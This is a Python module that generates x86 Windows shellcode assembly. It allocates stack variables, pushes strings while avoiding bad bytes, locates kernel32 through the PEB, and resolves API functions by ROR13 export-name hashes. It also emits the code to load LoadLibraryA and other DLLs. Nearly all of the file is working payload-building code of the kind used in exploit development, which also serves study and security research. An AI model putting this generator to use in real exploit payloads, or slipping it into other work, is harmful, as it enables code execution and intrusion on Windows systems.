"""Helpers for allocating and referencing stack-backed shellcode variables.

Offsets are allocated in bytes from a base register (``ebp`` by default):

    variables = ShellcodeHelper()
    variables.add("find_function")
    variables.write_var("find_function")
    # 'mov [ebp-0x4], eax ;'
"""

from __future__ import annotations

import re


from shellcode.push_string import push_dword, push_string

class ShellcodeHelper:
    """Allocate named stack slots and emit assembly references to them."""

    _name_re = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")

    # mandatory names
    _find_func = "find_function"
    _common_temp_var = "common_temp"
    _load_library = "LoadLibraryA" # needed for basic shellcode

    def __init__(
        self,
        start_offset: int = 4,
        step: int = 4,
        base_register: str = "ebp",
        bad_bytes: set[int] | None = None,
    ) -> None:
        if not isinstance(start_offset, int) or start_offset <= 0:
            raise ValueError("start_offset must be a positive integer")
        if not isinstance(step, int) or step <= 0:
            raise ValueError("step must be a positive integer")
        if not isinstance(base_register, str) or not self._name_re.fullmatch(
            base_register
        ):
            raise ValueError("base_register must be a valid register name")

        self.start_offset = start_offset
        self.step = step
        self.base_register = base_register
        self.bad_bytes = set() if bad_bytes is None else set(bad_bytes)
        self._variables: dict[str, int] = {}
        self._sizes: dict[str, int] = {}
        self._next_offset = start_offset

        # setup mandatory variables
        self.add(self._find_func)
        self.add(self._common_temp_var)
        self.add(self._load_library)

    def add(self, name: str, reserve: int = 0) -> int:
        """Register *name* and return its allocated byte offset.

        ``reserve`` is the total size in bytes to allocate for the variable.
        When omitted, a single normal slot (``step`` bytes) is allocated. The
        next variable is therefore allocated above the reserved area::

            variables.add("buffer", reserve=0x20)  # offset 0x4
            variables.add("next")                  # offset 0x24

        Re-registering a name raises ``ValueError`` so accidental stack-slot
        aliasing cannot silently corrupt generated shellcode.
        """
        self._validate_name(name)
        if not isinstance(reserve, int) or reserve < 0:
            raise ValueError("reserve must be a non-negative integer")
        if name in self._variables:
            raise ValueError(f"variable already registered: {name!r}")

        offset = self._next_offset
        size = reserve or self.step
        if size < self.step:
            raise ValueError("reserve must be 0 or at least one slot in size")
        if reserve and size % self.step != 0:
            raise ValueError("reserve must align to the allocation step size")
        self._variables[name] = offset
        self._sizes[name] = size
        self._next_offset += size
        return offset

    @staticmethod
    def align_dword(size: int) -> int:
        """Round *size* up to the next 4-byte boundary."""
        if not isinstance(size, int) or size < 0:
            raise ValueError("size must be a non-negative integer")
        return ((size + 3) // 4) * 4

    def _offset(self, name: str) -> int:
        """Return the offset for a registered variable."""
        self._validate_name(name)
        try:
            return self._variables[name]
        except KeyError as error:
            raise KeyError(f"unknown variable: {name!r}") from error

    def _get_offset_location(self, name: str, additional_offset: int = 0x00) -> str:
      """Return the raw ``base_register-0xNN`` location string for a variable."""
      if not isinstance(additional_offset, int) or additional_offset < 0:
        raise ValueError("additional_offset must be a non-negative integer")

      offset = self._offset(name)
      max_offset = self._sizes[name] - self.step
      if additional_offset > max_offset:
        raise ValueError("additional_offset exceeds reserved variable storage")

      offset = offset + max_offset - additional_offset
      return f"{self.base_register}-0x{offset:02x}"


    def load_library(self, name: str):
      """Emit the sequence that pushes a DLL name and calls ``LoadLibraryA``. Base address moved to EBX"""
      asm = [
        push_string(name, bad_bytes=self.bad_bytes), # push the dll name
        "push esp;",  # Push ESP as pointer to the string
        self.call_function(self._load_library), # Call LoadLibraryA
        "mov ebx, eax;", # Move the base address to EBX for find_function
      ]
      return asm

    def _ror_str(self, byte, count):
      """Rotate a 32-bit value right, matching the hash routine used in shellcode."""
      value = byte & 0xFFFFFFFF
      shift = count % 32
      if shift == 0:
          return value
      return ((value >> shift) | (value << (32 - shift))) & 0xFFFFFFFF


    def push_function_hash(self, name: str, clean_reg: str = "eax"):
        """Return the hash push instruction expected by the resolver stub."""
        edx = 0x00
        ror_count = 0
        # iterate for each character (ie: 'W', 'i', 'n', 'E', 'x', 'e'...)
        for eax in name:
            # add up the value
            edx = edx + ord(eax)
            # If it is not the last character, apply a 13-bit right rotation (0xd)
            # This ensures that each character uniquely affects the final signature
            if ror_count < len(name) - 1:
                edx = self._ror_str(edx, 0xD)
            ror_count += 1
        # pushes result
        return push_dword(edx, clean_reg, self.bad_bytes)


    def find_function(self, name: str, clean_reg: str = "eax"):
      """Emit hash push, resolver call, and stack-slot write for one API name."""
      asm = [
        self.push_function_hash(name, clean_reg), # push hash of function name
        self.call_function(self._find_func), # Call find_function, result lands in EAX
        self.write_var(name, "eax"), # save found function address in EAX to dedicated variable
      ]
      return asm


    def get_common_shellcode(self):
      """Return the shared resolver/bootstrap assembly used by payload builders."""
      common_shellcode = [
        "   find_kernel32:                       ",
        "       xor ecx,ecx                     ;", # ECX = 0
        "       mov esi,fs:[ecx+30h]            ;", # ESI = &(PEB) ([FS:0x30])
        "       mov esi,[esi+0Ch]               ;", # ESI = PEB->Ldr
        "       mov esi,[esi+1Ch]               ;", # ESI = PEB->Ldr.InInitOrder
        "   next_module:                         ",
        "       mov ebx, [esi+8h]               ;", # EBX = InInitOrder[X].base_address
        "       mov edi, [esi+20h]              ;", # EDI = InInitOrder[X].module_name
        "       mov esi, [esi]                  ;", # ESI = InInitOrder[X].flink (next)
        "       cmp [edi+12*2], cx              ;", # (unicode) modulename[12] == 0x00?
        "       jne next_module                 ;", # No: try next module.
        "   find_function_shorten:               ", #
        "       jmp find_function_shorten_bnc   ;", # Short jump
        "   find_function_ret:                   ", #
        "       pop esi                         ;", # POP the return address from the stack
        self.write_var("find_function", "esi")      , # Save find_function address for later usage
        "       jmp get_load_library_a          ;", # we need to guarantee loading of LoadLibraryA
        "   find_function_shorten_bnc:           ", #
        "       call find_function_ret          ;", # Relative CALL with negative offset
        "   find_function:                       ", #
        "       pushad                          ;", # Save registers. function's base must be in EBX.
        "       mov eax, [ebx+0x3c]             ;", # Offset to PE Signature
        "       mov edi, [ebx+eax+0x78]         ;", # Export Table Directory RVA
        "       add edi, ebx                    ;", # Export Table Directory VMA
        "       mov ecx, [edi+0x18]             ;", # NumberOfNames
        "       mov eax, [edi+0x20]             ;", # AddressOfNames RVA
        "       add eax, ebx                    ;", # AddressOfNames VMA
        self.write_var(self._common_temp_var)     , # Save AddressOfNames VMA for later
        "   find_function_loop:                  ", #
        "       jecxz find_function_finished    ;", # Jump to the end if ECX is 0
        "       dec ecx                         ;", # Decrement our names counter
        self.read_var(self._common_temp_var)      , # Restore AddressOfNames VMA
        "       mov esi, [eax+ecx*4]            ;", # Get the RVA of the symbol name
        "       add esi, ebx                    ;", # Set ESI to the VMA of the current
        "   compute_hash:                        ", #
        "       xor eax, eax                    ;", # NULL EAX
        "       cdq                             ;", # NULL EDX
        "       cld                             ;", # Clear direction
        "   compute_hash_again:                  ", #
        "       lodsb                           ;", # Load the next byte from esi into al
        "       test al, al                     ;", # Check for NULL terminator
        "       jz compute_hash_finished        ;", # If the ZF is set, we've hit the NULL term
        "       ror edx, 0x0d                   ;", # Rotate edx 13 bits to the right
        "       add edx, eax                    ;", # Add the new byte to the accumulator
        "       jmp compute_hash_again          ;", # Next iteration
        "   compute_hash_finished:               ", #
        "       cmp edx, [esp+0x24]             ;", # Compare the computed hash with the requested hash
        "       jnz find_function_loop          ;", # If it doesn't match go back to find_function_loop
        "       mov edx, [edi+0x24]             ;", # AddressOfNameOrdinals RVA
        "       add edx, ebx                    ;", # AddressOfNameOrdinals VMA
        "       mov cx, [edx+2*ecx]             ;", # Extrapolate the function's ordinal
        "       mov edx, [edi+0x1c]             ;", # AddressOfFunctions RVA
        "       add edx, ebx                    ;", # AddressOfFunctions VMA
        "       mov eax, [edx+4*ecx]            ;", # Get the function RVA
        "       add eax, ebx                    ;", # Get the function VMA
        "       mov [esp+0x1c], eax             ;", # Overwrite stack version of eax from pushad
        "   find_function_finished:              ", #
        "       popad                           ;", # Restore registers
        "       ret                             ;", #
        "   get_load_library_a:                  ", #
        self.find_function(self._load_library)    , # setup LoadLibraryA automatically
      ]
      return common_shellcode


    def get_esp_setup(self, additional=0x80):
      """
      Return the prolog that reserves stack space for variables and scratch use.
      """
      # Reserve enough space on the stack for the variables
      # plus an additional (default) 0x80 bytes of space
      reserved_bytes = self._total_bytes_reserved()
      decrease_stack_val = reserved_bytes + additional

      print(f"Space reserved: {hex(reserved_bytes)} bytes, reserving a total of {hex(decrease_stack_val)} stack bytes.")

      add_negative_decrease_stack_val = 0xffffffff & (0-(decrease_stack_val))

      return [
        "mov ebp, esp;",
        "add esp, " + hex(add_negative_decrease_stack_val)+";",
      ]

    def get_clear_variables(self):
      """Return the loop that zeroes every reserved variable dword on the stack."""
      # clear the variable memory before starting
      dword_count_space_for_variables = self._total_bytes_reserved() // 4

      asm = [
          "clear_variables:",
          self._get_lowest_address("edi"),
          "xor eax,eax;", # write 0x00000000 over the variables
          "xor ecx,ecx;", # prepare ecx for the counter value
      ]

      # set the number of reps, keeping everything 0-free
      # handle known cases containing 0s
      if(dword_count_space_for_variables < 0x100):
        asm.append("mov cl, " + hex(dword_count_space_for_variables) + ";")
      elif(dword_count_space_for_variables == 0x100):
          asm.append("mov cl, " + hex(dword_count_space_for_variables-1) + ";")
          asm.append("inc ecx;")
      else:
        if(dword_count_space_for_variables & 0xFF == 0x00):
          asm.append("mov cx, " + hex(dword_count_space_for_variables-1) + ";")
          asm.append("inc ecx;")
        else:
          asm.append("mov cx, " + hex(dword_count_space_for_variables) + ";")

      asm.append("cld;") # go forward in mem
      asm.append("rep stosd;") # clear all the variables

      return asm


    def set_variable_data(self, name: str, data, reg_addr: str = "edi") -> list[str]:
      """Emit byte writes that copy raw data into a reserved stack buffer."""
      register = self._validate_register(reg_addr)
      self._offset(name)

      data_bytes = []
      for char in data:
        byte_value = char if isinstance(char, int) else ord(char)
        if not 0 <= byte_value <= 0xFF:
          raise ValueError("data must contain only byte-sized values")
        data_bytes.append(byte_value)

      if len(data_bytes) > self._sizes[name]:
        raise ValueError("data exceeds reserved variable storage")

      instructions = []
      instructions.append(self.get_var_address(name, register)) # put address of var in register

      for index, byte_value in enumerate(data_bytes):
        if byte_value != 0x00:
            instructions.append(f"mov byte ptr[{register}], {hex(byte_value)};")
        if index != len(data_bytes) - 1:
            instructions.append(f"inc {register};")

      return instructions

    def set_variable_with_offset(self, name: str, offset, reg_src: str = "eax") -> list[str]:
      """Store a register at a field inside a reserved structure-like buffer."""
      register = self._validate_register(reg_src)
      location = self._get_offset_location(name, offset)

      return [f"mov [{location}], {register} ;"]

    def get_var_address(self, name: str, reg_dst: str = "eax") -> str:
        """Return a LEA command for the writable address of *name*.

        Reserved stack storage grows toward higher addresses.  Since the
        stack itself grows downward, return the lower end of a reserved
        buffer so writes stay inside the buffer instead of clobbering slots
        above it.
        """
        register = self._validate_register(reg_dst)
        location = self._get_offset_location(name)
        return f"lea {register}, [{location}]"

    def push_var_value(self, name: str, reg_tmp: str = "eax", offset = 0x00):
      """Load a saved dword value from a variable slot and push it as an argument."""
      register = self._validate_register(reg_tmp)
      instructions = []
      instructions.append(self.read_var(name, reg_dst=register, offset=offset))
      instructions.append(f"push {register};")
      return instructions


    def push_var_address(self, name: str, reg_tmp: str = "eax"):
      """Push the writable address of a reserved variable or buffer."""
      register = self._validate_register(reg_tmp)
      instructions = []
      instructions.append(self.get_var_address(name, register))
      instructions.append(f"push {register};")
      return instructions

    def write_var(self, name: str, reg_src: str = "eax", offset = 0x00) -> str:
        """Return the command that stores *source_register* in *name*."""
        register = self._validate_register(reg_src)
        return f"mov [{self._get_offset_location(name, offset)}], {register} ;"

    def read_var(self, name: str, reg_dst: str = "eax", offset = 0x00) -> str:
        """Return the command that loads *target_register* from *name*."""
        register = self._validate_register(reg_dst)
        return f"mov {register}, [{self._get_offset_location(name, offset)}] ;"

    def _get_lowest_address(self, reg_dst: str = "eax") -> str:
        """Return LEA command for writable address of lowest memory."""
        if not self._variables:
            raise ValueError("no variables allocated")

        topmost_name = max(self._variables, key=self._topmost_offset)
        return self.get_var_address(topmost_name, reg_dst)

    def call_function(self, name: str) -> str:
        """Return the command that calls the function pointer in *name*."""
        return f"call dword ptr [{self._get_offset_location(name)}] ;"

    def items(self):
        """Return registered names and offsets in allocation order."""
        return tuple(self._variables.items())

    def print_variables(self) -> None:
        """Print an assembly-style table of addresses and allocated space.

        The address shown is the writable address relative to ``base_register``;
        it matches the address used by :meth:`addr`.  The reported space
        is the total allocated space for each variable.
        """
        if not self._variables:
            print("; no variables allocated")
            return

        name_width = max(len(name) for name in self._variables)
        print("; variable allocations:")
        print(f"; {'name':<{name_width}}  address          reserved")
        names = sorted(
            self._variables,
            key=self._topmost_offset,
            reverse=True,
        )
        for name in names:
            offset = self._variables[name]
            reserved = self._sizes[name]
            address = (
                f"[{self.base_register}-0x"
                f"{offset + reserved - self.step:02x}]"
            )
            print(f"; {name:<{name_width}}  {address}  0x{reserved:02x} bytes")

    def _total_bytes_reserved(self) -> int:
        """Return the total number of bytes allocated for all variables."""
        return self._next_offset - self.start_offset

    def _topmost_offset(self, name: str) -> int:
        return self._variables[name] + self._sizes[name] - self.step

    @classmethod
    def _validate_name(cls, name: str) -> None:
        if not isinstance(name, str) or not cls._name_re.fullmatch(name):
            raise ValueError(
                "variable names must start with a letter/underscore and "
                "contain only letters, digits, and underscores"
            )

    @classmethod
    def _validate_register(cls, register: str) -> str:
        if not isinstance(register, str) or not cls._name_re.fullmatch(register):
            raise ValueError("register must be a valid register name")
        return register
